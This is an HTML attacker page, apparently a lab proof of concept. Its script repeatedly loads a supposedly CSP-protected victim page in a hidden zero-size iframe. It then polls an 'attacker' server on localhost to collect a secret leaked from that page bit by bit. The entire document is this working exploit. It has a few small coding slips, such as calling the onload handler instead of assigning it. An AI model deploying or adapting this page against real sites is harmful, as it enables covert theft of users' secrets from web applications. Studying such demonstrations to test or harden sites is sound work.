<!DOCTYPE html>
<html>
  <head>
    <title>You are being exploited</title>
    <script>
      // victim site has CSP enabled to restrict framing
      const victim = "http://127.0.0.1:8080/csp_frame_victim.html";
      const attacker = "http://127.0.0.1:8000/";
      let secret = "";
      let pre_secret = "";
      window.onload = async function() {
	  // reset attacker server state
	  await fetchText(attacker + "clearall");
	  appendIframe();
      }
      async function onloadHandler() {
	  console.log("iframe loaded");
	  // wait for the iframe to trigger request to attacker server
	  await new Promise(r => setTimeout(r, 4000));
	  // get the updated secret
	  secret = await fetchText(attacker + "secret");
	  console.log("exploited secret = " + secret);
	  if(secret !== pre_secret){
	      pre_secret = secret;
	      appendIframe();
	  }
	  else{
	      console.log("complete secret exploited");
	  }
      }
      function appendIframe(){
	  let iframe = document.createElement("iframe");
	  iframe.onload = onloadHandler();
	  iframe.src = victim;
	  iframe.style = "display: hidden";
	  iframe.height = "0";
	  iframe.width = "0";
	  iframe.frameborder = "0";
	  document.body.appendChild(iframe);
      }
      async function fetchText(url){
	  const response = await fetch(url);
	  const text = await response.text();
	  return text;
      }
    </script>
  </head>
  <body>
  </body>
</html>
